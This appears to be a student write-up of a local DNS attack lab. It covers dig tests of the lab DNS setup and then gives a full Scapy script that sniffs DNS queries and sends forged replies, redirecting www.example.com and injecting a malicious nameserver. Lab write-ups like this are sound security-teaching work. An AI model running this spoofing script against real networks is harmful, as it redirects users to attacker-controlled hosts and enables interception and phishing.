# Local DNS Attack Lab

## 2.4 Testing the DNS Setup

```
$ dig ns.attacker32.com
```
![Screenshot 2025-05-17 124530](https://github.com/user-attachments/assets/9908283a-6417-4be0-a1af-c29fd41451be)

We can see that the answer comes from the attacker nameserver because the dig command only returns the attacker namerserver IP adress.

---

```
$ dig www.example.com
```
![image](https://github.com/user-attachments/assets/12389a65-8795-4317-b38a-425e35e15478)

When trying to access ``` www.example.com ``` the DNS nameserver used is not the malicious one.

---

```
$ dig @ns.attacker32.com www.example.com
```
![image](https://github.com/user-attachments/assets/95c05e42-6cfc-442d-a154-0d809fa0dacf)

If we explicitly ask the attacker nameserver, we get a different (and false) IP adress for ```www.example.com```


#### Our goal: Get the user to ask the malicious nameserver first.  
---

## 3.1 Directly Spoofing Response to User

This is the script we used to spoof the DNS packet.
``` python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
        if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
                print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IPs

                udp = UDP(dport=pkt[UDP].sport, sport=53) # Swap the source and destination ports

                # The Answer Section
                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5') # Create an answer record
                # The Authority Section
                NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
                NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns2.example.net')
                # The Additional Section
                Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='10.9.0.153')
                Addsec2 = DNSRR(rrname='ns2.example.net', type='A', ttl=259200, rdata='5.6.7.8')

                # Create DNS object
                dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

                spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                send(spoofpkt)

myFilter = "udp and dst port 53" # only capture UDP traffic with destination port 53
pkt=sniff(iface='br-4a379a2ae130', filter=myFilter, prn=spoof_dns)
```

When we now execute ``` dig www.example.com ``` on the ``` user ``` machine, we see this:

![image](https://github.com/user-attachments/assets/3f77ea7b-ba63-4e16-ab09-781bc08a1894)

The answer contains the IP adress we inserted (```10.0.2.5```) and our attacker nameserver (```ns.attacker32.com```).
